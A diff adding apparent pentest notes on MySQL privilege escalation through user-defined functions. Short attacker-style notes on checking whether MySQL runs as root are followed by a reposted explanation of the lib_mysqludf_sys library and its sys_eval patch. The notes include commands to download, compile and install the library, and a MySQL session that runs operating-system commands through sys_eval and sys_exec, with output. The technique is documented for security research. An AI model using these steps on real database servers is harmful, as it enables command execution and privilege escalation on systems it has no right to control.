@@ -1,0 +1,72 @@
+﻿bypassing mysql through udf
+
+
+check permissiions
+To check whether mysql service is running or not, type ps -ef | grep root | grep mysql
+if MySQL service is running by root user so we can think about privilege escalation with MySQL User Defined Functions (UDF).
+ls -la /usr/lib/lib_mysqludf_sys.so
+
+
+
+
+
+Modern database management systems are powerful applications: they provide several instruments to interact with the underlying operating system.
+
+On MySQL it is possible to create a User-Defined Function to execute commands on the underlying operating system. Marco Ivaldi demonstrated that some years ago. His raptor_udf2.c works well, but it has two limitations:
+
+    It is not MySQL 5.0+ compliant because it does not follow the new guidelines to create a proper UDF.
+    It calls C function system() to execute the command and returns always integer 0.
+
+These limitations make the UDF almost useless on recent MySQL server installations if the database administrator wants to get the exit status of the command as UDF output or the command standard output itself.
+
+I recently came across an open repository of MySQL User-Defined Functions maintained by Roland Bouman and other developers. One of their codes kept my attention: lib_mysqludf_sys (version 0.0.2) which implements three different functions to interact with the underlying environement:
+
+    sys_exec: executes an arbitrary command, and can thus be used to launch an external application.
+    sys_get: gets the value of an environment variable.
+    sys_set: create an environment variable, or update the value of an existing environment variable.
+
+The first function can be used to execute operating system commands and has two advantages over raptor's UDF:
+
+    It is MySQL 5.0+ compliant and it compiles on both Linux as a shared object and on Windows as a dynamic-link library.
+    It returns the exit status of the executed command.
+
+However, none of these two functions return the command standard output so I took some time to patch this last source code adding a sys_eval() UDF to return the standard output of the command if it success, NULL otherwise.
+
+The patched source code can be found on sqlmap subversion repository here and a single patch file for the original lib_mysqludf_sys version 0.0.2 is available here.
+
+Usage example:
+
+    $ wget --no-check-certificate https://svn.sqlmap.org/sqlmap/trunk/sqlmap/extra/mysqludfsys/lib_mysqludf_sys_0.0.3.tar.gz
+    $ tar xfz lib_mysqludf_sys_0.0.3.tar.gz
+    $ cd lib_mysqludf_sys_0.0.3
+    $ sudo ./install.sh
+    Compiling the MySQL UDF
+    gcc -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o /usr/lib/lib_mysqludf_sys.so
+    MySQL UDF compiled successfully
+
+    Please provide your MySQL root password
+    Enter password:
+    MySQL UDF installed successfully
+    $ mysql -u root -p mysql
+    Enter password:
+    [...]
+    mysql> SELECT sys_eval('id');
+    +--------------------------------------------------+
+    | sys_eval('id') |
+    +--------------------------------------------------+
+    | uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+    +--------------------------------------------------+
+    1 row in set (0.02 sec)
+
+    mysql> SELECT sys_exec('touch /tmp/test_mysql');
+    +-----------------------------------+
+    | sys_exec('touch /tmp/test_mysql') |
+    +-----------------------------------+
+    | 0 |
+    +-----------------------------------+
+    1 row in set (0.02 sec)
+
+    mysql> exit
+    Bye
+    $ ls -l /tmp/test_mysql
+    -rw-rw---- 1 mysql mysql 0 2009-01-16 23:18 /tmp/test_mysql
